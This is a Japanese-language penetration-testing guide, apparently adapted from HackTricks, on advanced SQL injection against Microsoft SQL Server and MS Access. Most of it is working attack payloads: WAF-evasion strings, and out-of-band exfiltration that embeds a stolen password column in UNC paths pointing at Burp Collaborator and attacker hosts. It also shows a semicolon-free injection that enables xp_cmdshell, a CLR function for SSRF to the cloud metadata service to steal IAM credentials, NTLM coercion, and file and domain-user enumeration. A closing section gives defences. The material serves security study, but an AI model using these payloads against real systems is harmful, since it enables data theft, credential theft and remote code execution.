## HackTricks高度なMSSQL/MS Access

本節では、Microsoft SQL Server（MSSQL）とMicrosoft Access（Jet/ACEデータベースエンジン）を対象とした、実務で有用な高度なSQLインジェクション技法をまとめる。前者はエンタープライズ向けRDBMSとしてActive Directory環境に深く統合されている点が攻撃面を広げており、後者はレガシーな組み込みデータベース（.mdb/.accdb）でありながら、Classic ASPアプリケーションなどで今なお現役の攻撃対象として遭遇する。両者とも「その製品特有の関数・演算子・エラー挙動」をどう悪用するかが核心であり、汎用のUNIONベースSQLiの知識だけでは太刀打ちできない場面が多い。

### MSSQL: ドメインユーザーの列挙

MSSQLはActive Directory統合認証（Windows認証）を前提に運用されることが多く、SQLインジェクションを起点にドメインのユーザー一覧を割り出せる場合がある。鍵となるのは次の3つの組み込み関数である。

- `SELECT DEFAULT_DOMAIN()` — 現在のドメイン名を取得する。
- `master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))` — 指定したドメインユーザー（ここでは`Administrator`）のSID（セキュリティ識別子）を16進文字列で返す。
- `SUSER_SNAME(0x...)` — 逆に、SIDを与えるとユーザー名を返す。

なぜこれが列挙に使えるのか。WindowsのSIDは`ドメインID + RID（相対識別子）`という構造を持つ。`Administrator`アカウントのRIDは常に`500`固定であり、これはWindowsのセキュリティモデル上の予約値である。したがって`SUSER_SID('DOMAIN\Administrator')`の返り値をhex化すると、末尾4バイト（リトルエンディアンで解釈すれば`500`）を除いた残りのバイト列が、そのドメインに固有の「ドメインID」だとわかる。

```python
def get_sid(n):
	domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
	user = struct.pack('<I', int(n))
	user = user.hex()
	return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```

このドメインIDを固定し、RID部分だけをリトルエンディアンでパックして末尾に連結すれば、任意のRIDに対応するSIDを合成できる。一般ユーザーのRIDは通常1000から採番が始まるため、1000〜2000程度の範囲をブルートフォースし、それぞれのSIDを`SUSER_SNAME()`に渡してユーザー名が返るかを確認すれば、ドメイン内の実在ユーザーを大量に洗い出せる。これはSQLインジェクションの脆弱性をActive Directoryの偵察（reconnaissance）フェーズに転用する典型例であり、後続のパスワードスプレー攻撃やASREPRoast等の標的リスト作成に直結する。

> 出典: MSSQL Injection — https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection

### エラーベース注入の代替ベクタ（WAF回避）

典型的なエラーベースSQLiは`+AND+1=@@version--`のような、型変換エラーを強制的に発生させて結果をエラーメッセージに反映させる手法だが、この構文パターンはWAF（Web Application Firewall）のシグネチャに引っかかりやすい。回避策として、`%2b`（URLエンコードされた`+`、文字列連結演算子）を使い、型変換エラーを誘発する関数呼び出しの結果を連結する。

利用できる関数の例:

- `SUSER_NAME()`
- `USER_NAME()`
- `PERMISSIONS()`
- `DB_NAME()`
- `FILE_NAME()`
- `TYPE_NAME()`
- `COL_NAME()`

```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```

なぜ動くのか。これらの関数は本来`nvarchar`等の文字列型を返すが、注入先が数値コンテキストなど別の型として扱われる箇所であれば、文字列と数値の暗黙変換に失敗しエラーが発生する。そのエラーメッセージにはしばしば「変換できなかった値」そのものが含まれるため、`user_name(@@version)`のように関数の引数にダンプしたい値（この例では`@@version`、サーバーのバージョン文字列）を仕込むことで、エラーメッセージ経由で値をリークできる。単純な`AND 1=@@version`という構文をブロックするWAFのルールを、関数呼び出し形式に言い換えることで迂回する狙いである。

> 出典: MSSQL Injection — https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection

### SSRF/OOB（帯域外）を狙う関数群

MSSQLには、UNC（Universal Naming Convention、`\\host\share`形式）パスやURLを引数に取り、外部ホストへアクセスする組み込み関数・ストアドプロシージャが多数存在する。これらは元来運用管理用途だが、攻撃者が制御するリスナー（DNSやSMB、HTTPのキャプチャサーバー）へアクセスさせることで、SSRF（Server-Side Request Forgery、サーバーに攻撃者指定のリクエストを強制する脆弱性）やOOBデータ抽出（クエリの戻り値を直接読めない場合に、DNSやSMBの副作用でデータを外部に持ち出す手法）を実現できる。

#### `fn_xe_file_target_read_file`

Extended Events（拡張イベント）のファイルターゲットを読む関数。SQL Server 2019以前では`VIEW SERVER STATE`権限が必要、2022以降は`VIEW SERVER PERFORMANCE STATE`（データベーススコープでは`VIEW DATABASE PERFORMANCE STATE`）に細分化された点に注意する。Azure SQL Database/Managed Instanceでは`https://`のBlob URLを読む仕様に変わっているため、従来の`\\attacker\...`によるオンプレ向けOOBトリックは主にオンプレSQL Serverでのみ有効である。

```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```

第2引数のUNCパスにサブクエリで取得した機密値（ここでは`pass`カラム）をホスト名の一部として連結している。SQL Serverがこのパスへアクセスしようとする際、名前解決のためにDNSクエリが飛ぶ。攻撃者がBurp Collaboratorのような外部リスナーを制御していれば、そのDNSクエリのサブドメイン部分（=漏洩させたい値）をログから読み取れる。これはHTTPレスポンスに値が直接出ない「ブラインド」な状況でも機能する強力な抽出経路である。

権限の有無は次のクエリで確認できる。

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name IN ('VIEW SERVER STATE', 'VIEW SERVER PERFORMANCE STATE');
SELECT * FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name='VIEW DATABASE PERFORMANCE STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```

#### `fn_get_audit_file`

サーバー監査ログを読む関数。2019以前は`CONTROL SERVER`（実質的にサーバー全体の管理者権限）が必要だが、2022以降は`VIEW SERVER SECURITY AUDIT`権限のみで読めるよう緩和された。

```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```

原理は`fn_xe_file_target_read_file`と同じで、監査ログファイルの読み込み先としてUNCパスを指定させ、そのDNS解決を悪用してデータを持ち出す。

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name IN ('CONTROL SERVER', 'VIEW SERVER SECURITY AUDIT');
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```

#### `fn_trace_gettable`

SQLトレースファイル（`.trc`）を読み込む関数で、`CONTROL SERVER`権限が必要。同様にUNCパスのDNS解決を悪用する。

```sql
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```

#### `xp_dirtree` / `xp_fileexist` / `xp_subdirs`

Microsoft公式にはドキュメント化されていない拡張ストアドプロシージャ群だが、ネットワーク共有への操作用途で古くから知られ、OOBデータ抽出の定番として使われてきた。`xp_dirtree`はネットワーク要求を発生させるが、**TCP 445番ポート固定**（SMB用）でありポート変更はできない。

```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\' + @user + '.attacker-server\\aa"');
```

これは値を取得したいカラム（例では`user`）を変数に格納し、それをホスト名の一部として組み立てたUNCパスへ`xp_dirtree`でアクセスさせている。SMB接続の試行（多くの場合DNS解決を伴う）がそのまま帯域外チャネルになる。ただし、SQL Server 2019 RTM + Windows Server 2016のデフォルト構成など、環境によっては動作しないケースが報告されている点に留意する必要がある。`xp_fileexist`や`xp_subdirs`も同種の目的で代替として使える。

#### `OPENROWSET(BULK...)` と `BULK INSERT`

スタックドクエリ（1つの注入ポイントで複数文を連続実行できる状況）とバルク権限がある場合、`OPENROWSET(BULK...)`はローカルファイルの読み取りと、攻撃者制御のUNCパスへのアクセスの両方に使える強力な手段である。特にSQL Server認証（Windows認証ではなくSQLログイン）でログインしている場合、リモートファイルアクセスは**SQL Serverサービスアカウントのセキュリティコンテキスト**で実行される。これはつまり、単にファイルを読むだけでなく、サービスアカウントのNetNTLM認証情報を攻撃者側へリーク（あるいはリレー中継）させられることを意味する。

```sql
-- Read a local file
SELECT * FROM OPENROWSET(BULK N'C:/Windows/win.ini', SINGLE_CLOB) AS x;

-- Error-based variant
https://vuln.app/getItem?id=1+and+1=(select+x+from+OpenRowset(BULK+'C:/Windows/win.ini',SINGLE_CLOB)+R(x))--

-- SMB/UNC coercion
CREATE TABLE #TEXTFILE (column1 NVARCHAR(100));
BULK INSERT #TEXTFILE FROM '\\attacker\share\file';
DROP TABLE #TEXTFILE;
```

権限確認は以下で行う。

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTER BULK OPERATIONS';
SELECT * FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name='ADMINISTER DATABASE BULK OPERATIONS';
SELECT IS_SRVROLEMEMBER('bulkadmin');
```

Azure SQL Database/Managed Instanceではバルクプロバイダの入力元がBlob/URIベースに変わっているため、オンプレ特有のSMBトリックはクラシックなオンプレSQL Server環境で主に有効という点も押さえておく。

レガシー環境（SQL Server 2008世代など）では、`BACKUP ... TO DISK='\\attacker\file'`や`RESTORE ... FROM DISK='\\attacker\file'`がUNCパスを**認可チェックより前に解決してしまう**という設計上の欠陥があり、これも同種のNTLM窃取・ファイル操作の原始的な手法として悪用可能だった。ただし2016年のセキュリティ更新（MS16-136）でこの挙動は修正されているため、サポート対象バージョンでは通用しない、古いビルド固有の手法として理解しておく。

#### `sys.dm_os_enumerate_filesystem` / `sys.dm_os_file_exists`

`xp_dirtree`や`xp_fileexist`が権限剥奪（revoke）されて使えない環境でも、動的管理関数（DMF: Dynamic Management Function）である`sys.dm_os_enumerate_filesystem`や`sys.dm_os_file_exists`を使うと、SQL Serverサービスアカウントに強制的にSMB認証を行わせられる（さらにファイルシステムのメタデータまで取得できる場合もある）ことが近年の研究で示されている。

```sql
SELECT * FROM sys.dm_os_enumerate_filesystem('\\attacker\share', '*');
SELECT * FROM sys.dm_os_file_exists('\\attacker\share\file');
```

権限エラーが出た場合は、現在のコンテキストで以下のようなVIEW STATE系権限を先に確認すると良い。

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name IN ('VIEW SERVER STATE', 'VIEW SERVER PERFORMANCE STATE');
SELECT * FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name IN ('VIEW DATABASE STATE', 'VIEW DATABASE PERFORMANCE STATE');
```

`xp_dirtree`が塞がれていても代替経路が残っているという事実は、「1つの既知の悪用経路をブロックしただけでは攻撃面は閉じない」という典型例であり、防御側は個別の関数・プロシージャの権限剥奪だけでなく、SQL Serverサービスアカウントからの意図しないアウトバウンド接続自体をネットワークレベルで遮断する必要がある。

> 出典: MSSQL Injection — https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection

### `xp_cmdshell`によるRCEとCLR UDF経由のHTTPリクエスト

`xp_cmdshell`（OSコマンドを直接実行できる拡張ストアドプロシージャ、デフォルトでは無効化されている）を使えば、SSRFを引き起こすコマンド（例えば`curl`や`nslookup`）をそのまま実行させることも可能である。`xp_cmdshell`自体の有効化手順や権限昇格の詳細は、MSSQLのネットワークサービスペンテストに関する章を参照されたい。

より高度な選択肢として、CLR UDF（Common Language Runtime User Defined Function、.NET言語で書かれ、DLLにコンパイルされてSQL Server内にロードされるカスタム関数）を作成する方法がある。これには`dbo`アクセス権が必要であり、実務上は`sa`または管理者ロールでの接続時にのみ現実的な手段となる。

[SQLHttpリポジトリ](https://github.com/infiniteloopltd/SQLHttp)で提供される`http.cs`の核心部分は次のとおりである。

```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
    [Microsoft.SqlServer.Server.SqlFunction]
    public static SqlString http(SqlString url)
    {
        var wc = new WebClient();
        var html = wc.DownloadString(url.Value);
        return new SqlString(html);
    }
}
```

`CREATE ASSEMBLY`を実行する前に、アセンブリのSHA512ハッシュをサーバーの信頼済みアセンブリ一覧（`select * from sys.trusted_assemblies;`で確認可能）に追加しておく必要がある。

```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```

アセンブリの追加と関数作成が完了すれば、任意のURLへHTTP GETリクエストを送信できる。

```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```

この例のURL（`169.254.169.254`）はクラウド環境のメタデータサービス（IMDS）の既知アドレスであり、CLR UDFを通じてSSRFを行い、SQL Serverが動作しているホスト（クラウドインスタンス）のIAM一時クレデンシャルを窃取しようとする典型的な攻撃パターンを示している。SQLインジェクションが最終的にクラウド基盤全体の侵害につながりうる、という点で極めて高いインパクトを持つ。

> 出典: MSSQL Injection — https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection

### 単一クエリでテーブル全体を抽出する`FOR JSON`テクニック

通常、SQLインジェクションで複数行・複数列のデータをまとめて抽出するにはXML化（`FOR XML`、`raw`モードなどの指定が必要でやや冗長）を使うことが多いが、`FOR JSON AUTO`句を使うとより簡潔に同じことができる。

`information_schema.columns`（全テーブル・カラムのメタ情報を保持するシステムビュー）からスキーマ・テーブル名・カラム名をまとめて取得する例:

```sql
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
```

エラーベースの文脈で使う場合は、式に必ずエイリアス（別名）を与える必要がある。`FOR JSON`はJSONオブジェクトのキー名を必要とするため、名前のない式（無名の計算結果）はJSON化できずエラーになるからである。

```sql
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```

`concat_ws(0x3a, ...)`はセパレータとして`0x3a`（コロン`:`のバイト表現）を使い複数カラムを1つの文字列に連結しており、これにより本来複数列に分かれるはずの情報を1列に押し込め、UNIONベースのカラム数制約を回避しつつ大量の情報を一度に持ち出せる。

### 実行中クエリの取得

`VIEW SERVER STATE`権限があれば、インスタンス上で実行中の全セッションを閲覧できる（権限がなければ自セッションのみ）。`sys.dm_exec_requests`と`sys.dm_exec_sql_text`を組み合わせることで、実行中のSQLクエリ本文そのものを取得できる。

```sql
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```

これは他セッション（他ユーザーや管理ツールが発行した）クエリの内容を盗み見ることになり、接続文字列やハードコードされた認証情報がクエリ内に紛れ込んでいた場合、それらを丸ごと窃取できてしまう可能性がある。

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```

> 出典: MSSQL Injection — https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection

### WAF回避の小技

MSSQLの構文パーサの「揺らぎ」を突くことで、正規表現ベースのシグネチャ検知を回避できる場合がある。

**非標準空白文字**（UTF-8としてエンコードされた空白類似文字）:

```
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```

`%C2%85`（NEL, Next Line）や`%C2%A0`（NBSP, ノーブレークスペース）は、SQL Serverのパーサ上は通常の空白として扱われる一方、WAFのシグネチャが半角スペースやタブなど限られた文字種しか「空白」として認識していないと、`union`や`select`といった危険キーワードの前後に予期しない文字を挟むだけで検知をすり抜けられる。

**科学的記数法（`0e`）と16進表記（`0x`）によるUNIONの難読化**:

```
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--
https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```

数値リテラルの直後にキーワードが続く形はパーサが数値と識別子の境界を自動判定してくれるため、`0e` や `0x` と `union` の間に空白がなくても構文として成立する。WAFが「`union`の前に空白かスペース相当がある」ことを検知条件にしていると、この形は素通りしてしまう。

**`FROM`とカラム名の間をピリオドにする**:

```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```

**`\N`をSELECTと使い捨てカラムの間のセパレータにする**:

```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```

これらはいずれも「SQL構文として許容される空白・区切り文字の範囲」と「WAFのシグネチャが想定する空白・区切り文字の範囲」のズレを突く手法であり、本質的にはパーサの寛容さと検知ルールの厳格さの非対称性を利用している。

#### セミコロン不要のスタックドクエリ

[AWS WAF Clients Left Vulnerable to SQL Injection](https://gosecure.ai/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)（2023年6月公開、GoSecure社のブログ）で報告された手法によれば、MSSQLは`;`（セミコロン）なしでも複数の文を連続実行できる、という一般にあまり知られていない設計上の挙動がある。

```sql
SELECT 'a' SELECT 'b'
```

これは通常次のように書かれる複数文:

```sql
use [tempdb]
create table [test] ([id] int)
insert [test] values(1)
select [id] from [test]
drop table[test]
```

セミコロンなしで次のように圧縮できる。

```sql
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```

多くのWAFは「スタックドクエリ＝セミコロンで連結された複数文」という前提でシグネチャを組んでいるため、セミコロンを一切使わないこの形はその前提を裏切り検知をすり抜ける。実例として次のようなペイロードが紹介されている。

```sql
# Adding a useless exec() at the end and making the WAF think this isn't a valid query
admina'union select 1,'admin','testtest123'exec('select 1')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# Using weirdly built queries
admin'exec('update[users]set[password]=''a''')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Or enabling xp_cmdshell
admin'exec('sp_configure''show advanced options'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## This will be
select * from users where username = ' admin'
exec('sp_configure''show advanced options'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

最後の例は特に重要である。`sp_configure`を2回呼び出すことで「詳細オプションの表示を有効化」→「`xp_cmdshell`を有効化」という手順を、セミコロンなしの1本のペイロードに詰め込んでおり、これが成功すればOSコマンド実行（RCE）へ直結する。角括弧`[]`（SQL Serverの識別子区切り記号）やコメント`/**/`を空白の代替として使っている点も、前述のWAF回避テクニックと同じ発想である。

> 出典: MSSQL Injection — https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection

---

### MS Access（Jet/ACE）SQLインジェクション

MS AccessはWindows専用のデスクトップ向けデータベースエンジン（Jet 4.0、後継のACEエンジン）であり、`.mdb`/`.accdb`ファイルとして実体を持つ。Classic ASPなど古めのWebアプリケーションで今も稼働している例があり、MSSQLやMySQLとは大きく異なる制約と挙動を持つため専用の攻略パターンが必要になる。

#### 文字列連結とコメントの扱い

文字列連結は`&`（`%26`）と`+`（`%2b`）のどちらでも可能である。

```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```

MS Accessには他のRDBMSにあるような`--`や`/* */`のコメント構文が存在しない。その代わり、NULL文字（`%00`）を注入すると、それ以降のクエリ文字列が事実上無視される（アプリケーション側の文字列処理やAccessエンジンがNULL終端文字列として扱うため）という挙動を利用してクエリの残りを切り捨てられる。

```sql
1' union select 1,2 from table%00
```

これが機能しない場合は、構文エラーを起こさないよう末尾の構文を自分で正しく閉じる形にする。

```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```

#### スタックドクエリとLIMITの非対応

MS Accessは**スタックドクエリをサポートしない**。また**`LIMIT`演算子も実装されていない**。代わりに、返却する先頭N行を制限する`TOP`演算子を使う。

```sql
1' UNION SELECT TOP 3 attr FROM table%00
```

`TOP`と対をなす`LAST`演算子を使うと、末尾からの行を取得できる。この`TOP`+`LAST`の組み合わせは、後述する「特定の1行だけを狙い撃つ」ブラインドインジェクションの土台になる。

#### `FROM`句が必須という制約

MS Accessでは、サブクエリや追加クエリ内で**必ず`FROM`句を明示する**必要がある。したがって`UNION SELECT`や`UNION ALL SELECT`、あるいは条件式内の括弧付き`SELECT`を実行する際にも、有効なテーブル名を伴う`FROM`が必要になる。裏を返せば、**有効なテーブル名を1つも知らなければクエリを構文的に成立させられない**という、他のDBにはない強い制約がある。

```sql
-1' UNION SELECT username,password from users%00
```

#### チェーン等式＋Substringによるテーブル名不要の抽出

MS Accessは`'1'=2='3'='asd'=false`のような、一見奇妙な連鎖する等式（チェーン等式）構文を許容する。SQLインジェクションの注入箇所が多くの場合`WHERE`句の中にあることを利用し、これを悪用する。

カラム名`username`の存在を知っている、または推測できたとする。`Mid`関数（部分文字列を取得する関数）を使ったブール型インジェクション（真偽の違いをアプリケーションの応答差から読み取る手法）で、テーブル名を知らなくても現在のテーブルから値を抽出できる。

```sql
'=(Mid(username,1,3)='adm')='
```

テーブル名とカラム名の両方が分かっている場合は、`Mid`・`LAST`・`TOP`を組み合わせることで、任意の行の値をブールSQLiで丸ごとリークできる。

```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```

これは「`TOP 1`で先頭1行に絞り込んだサブクエリの、さらに`LAST`で末尾（=その1行）を取り出し、`Mid`で文字位置ごとに1文字ずつ比較する」という三段構えになっており、行の位置指定とカラム内の文字位置指定を`TOP`/`LAST`/`Mid`の組み合わせだけで実現している点がAccess特有の工夫である。

#### テーブル名・カラム名のブルートフォース

チェーン等式のテクニックを使えば、テーブル名自体もブルートフォースできる。

```sql
'=(select+top+1+'lala'+from+<table_name>)='
```

より伝統的な書き方も可能:

```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```

sqlmapが同梱する共通テーブル名リスト（`data/txt/common-tables.txt`）や、nibblesecが公開しているMS Access向けチートシートのワードリストも辞書として活用できる。

カラム名は、チェーン等式で:

```sql
'=column_name='
```

`GROUP BY`を使う方法もある。

```sql
-1' GROUP BY column_name%00
```

`GROUP BY`でのブルートフォースが機能するのは、存在しないカラム名を指定すると構文エラー（またはSELECT対象と集約指定の不整合エラー）が発生し、存在するカラム名なら正常応答になる、という応答の違いを利用できるためである。

別テーブルのカラム名をブルートフォースする場合:

```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```

#### `IIF`関数によるデータ抽出

```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```

`IIF(条件, 真の場合の値, 偽の場合の値)`はAccessにおけるif-then式であり、条件が真なら`200 OK`、偽なら`500 Internal Error`のような応答差をアプリケーション側に発生させるよう設計する。`TOP 10`で先頭10行に絞り、その中から`LAST`で10番目の行だけを狙い撃ちし、`MID`で1文字ずつ比較する。`TOP`の値と`MID`の開始位置を系統的に変えていけば、`username`列の全行・全文字を総当たりで復元できる。

#### 時間ベース（ブラインド）インジェクション

Jet/ACE SQLエンジン自体には、MySQLの`SLEEP()`やMSSQLの`WAITFOR DELAY`に相当するネイティブな遅延関数が**存在しない**。そのため従来型の時間ベースブラインドSQLiは制限される。ただし、エンジンにネットワークリソースへのアクセスを強制することで、間接的に測定可能な遅延を発生させられる。応答を返す前にファイル（データベース）を開こうとするエンジンの挙動を利用し、HTTPの応答時間が攻撃者制御ホストへの往復遅延を反映するようにする。

```sql
' UNION SELECT 1 FROM SomeTable IN '\\10.10.14.3\doesnotexist\dummy.mdb'--
```

UNCパスの参照先として次のようなものを指定すると効果的である。

- 高レイテンシ回線の先にあるSMB共有
- `SYN-ACK`の後にTCPハンドシェイクを故意に放棄するホスト
- ファイアウォールのシンクホール（パケットを受けて応答しないブラックホール）

こうして生じる数秒単位の遅延を、ブール条件に応じて「遅いパスを選ぶかどうか」を切り替えるオラクルとして使えば、帯域外タイミングオラクルとしてブラインドインジェクションが成立する。Microsoftはこのリモートデータベース参照の挙動と、それを無効化するレジストリのキルスイッチについてKB5002984で公式に説明している。

#### その他の有用な関数

- `Mid('admin',1,1)` — 部分文字列取得（開始位置1、長さ1。Accessでは文字列の先頭位置は1から数える）
- `LEN('1234')` — 文字列長取得
- `ASC('A')` — 文字のASCIIコード値取得
- `CHR(65)` — ASCIIコード値から文字取得
- `IIF(1=1,'a','b')` — if-then式
- `COUNT(*)` — 件数カウント

#### テーブルの列挙

```sql
select MSysObjects.name
from MSysObjects
where
   MSysObjects.type In (1,4,6)
   and MSysObjects.name not like '~*'
   and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```

`MSysObjects`はAccessの全オブジェクト（テーブル、クエリ等）のメタデータを保持するシステムテーブルであり、`type`カラムでオブジェクト種別を、`~*`や`MSys*`の除外条件でシステム内部オブジェクトを除いた実テーブルのみを絞り込んでいる。ただし、SQLインジェクションが発生している環境では、権限設定により`MSysObjects`自体への読み取りアクセスがそもそも許可されていないケースが非常に多い点に注意が必要である。その場合は前述のテーブル名ブルートフォースに頼ることになる。

#### ファイルシステムへのアクセス

**Webルートの絶対パス特定**: アプリケーションのエラーメッセージが完全に隠蔽されていない場合、存在しないデータベースへの参照を試みることでWebルートの絶対パスが判明することがある。

```
http://localhost/script.asp?id=1'+ '+UNION+SELECT+1+FROM+FakeDB.FakeTable%00
```

MS Accessは、このクエリに対してWebディレクトリのフルパスを含むエラーメッセージを返すことがある。

**ファイル存在の推測（File Enumeration）**: 次のベクタはリモートファイルシステム上のファイル存在を推測するために使える。指定ファイルが存在すると、データベース形式が不正だというエラーメッセージがトリガーされる。

```
http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00
```

別の方法として、`database.table`形式で項目を指定するやり方もある。指定ファイルが存在すれば、データベース形式エラーメッセージが表示される。

```
http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00
```

**`.mdb`ファイル名の推測**:

```
http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00
```

`name[i]`は推測する`.mdb`ファイル名、`realTable`はデータベース内に実在するテーブル名である。この場合、MS Accessは常に何らかのエラーメッセージを返すが、そのエラーメッセージの文言や種類によって「無効なファイル名」と「有効な`.mdb`ファイル名」を区別できる。

#### リモートデータベースアクセスとNTLM資格情報窃取（2023年に再検証）

Jet 4.0以降、クエリは`IN '<path>'`句を使って**別の`.mdb`/`.accdb`ファイル**にあるテーブルを参照できる。

```sql
SELECT first_name FROM Employees IN '\\server\share\hr.accdb';
```

もし`IN`以降の部分にユーザー入力が結合されていたり、`JOIN … IN`/`OPENROWSET`/`OPENDATASOURCE`の呼び出しに入力が混入していたりすると、攻撃者は自身が制御するホストを指すUNCパスを指定できる。この場合、Accessエンジンは次のような一連の動作を行う。

1. リモートデータベースを開くためSMB/HTTP経由の認証を試みる。
2. その過程でWebサーバーのNTLM資格情報が強制認証（forced authentication、被害者側から能動的に認証情報を差し出させる攻撃パターン）によって漏洩する。
3. リモートファイルをパースしようとする。細工された、あるいは破損したデータベースファイルはJet/ACEエンジンのメモリ破損バグ（例: CVE-2021-28455）を突く経路になりうる。

実際の注入例:

```sql
1' UNION SELECT TOP 1 name
   FROM MSysObjects
   IN '\\attacker\share\poc.mdb'-- -
```

影響としては、

- Net-NTLMv2ハッシュの帯域外流出（リレー攻撃やオフラインクラッキングに利用可能）
- Jet/ACEパーサの新規バグが悪用された場合のリモートコード実行の可能性

が挙げられる。防御策としては次が推奨される（レガシーなClassic ASPアプリケーションであっても実施すべき）。

- レジストリ値`AllowQueryRemoteTables`を`0`に設定する（`HKLM\Software\Microsoft\Jet\4.0\Engines`配下、および対応するACEのパス配下）。これによりJet/ACEは`\\`で始まるリモートパスを拒否するようになる。
- ネットワーク境界でアウトバウンドのSMB/WebDAV通信を遮断する。
- `IN`句に入り込みうるクエリ部分を、必ずサニタイズ・パラメータ化する。

この強制認証ベクタは、2023年にCheck Point Researchによって再検証されており、レジストリキーが未設定の完全パッチ適用済みWindows Serverでも依然として悪用可能であることが実証されている。SQLインジェクションという「データベースの脆弱性」が、ネットワーク認証プロトコル（NTLM）の弱点と組み合わさることで、Web層の脆弱性がActive Directory環境全体への侵害の足がかりになりうる好例である。

#### `.mdb`パスワードクラッカー

[Access PassView](https://www.nirsoft.net/utils/accesspv.html)は、Microsoft Access 95/97/2000/XPやJet Database Engine 3.0/4.0のメインデータベースパスワードを復元できる無償ツールである。SQLインジェクションでファイルシステム経由の探索などによって`.mdb`ファイルそのものへアクセスできた場合、その保護パスワードを突破する手段として利用できる。

> 出典: MS Access SQL Injection — https://hacktricks.wiki/en/pentesting-web/sql-injection/ms-access-sql-injection.html

### まとめと防御上の要点

MSSQL/MS Accessいずれの節にも共通するのは、「汎用的なUNIONベース・ブールベースのSQLi対策だけでは不十分」という点である。防御側は以下を押さえておく必要がある。

- **最小権限の原則を関数・プロシージャ単位で徹底する**: `VIEW SERVER STATE`、`CONTROL SERVER`、`ADMINISTER BULK OPERATIONS`、`bulkadmin`ロールなどは、SSRFやOOB抽出の踏み台になりうる。不要な権限は剥奪し、剥奪後も代替経路（DMF等）が残っていないか継続的に確認する。
- **アウトバウンド接続そのものを制限する**: `xp_dirtree`個別の無効化だけでなく、SQL Serverサービスアカウントからの不要なSMB/HTTP/DNSアウトバウンド通信をネットワーク境界でブロックすることが、個々の関数の抜け道を塞ぐより本質的な対策になる。
- **WAFのシグネチャに依存しすぎない**: 空白文字の揺らぎやセミコロンなしのスタックドクエリなど、パーサの寛容さを突く手法は今後も新しいバリエーションが出続ける。根本対策はプリペアドステートメント（パラメータ化クエリ）の徹底であり、WAFは多層防御の一部と位置づける。
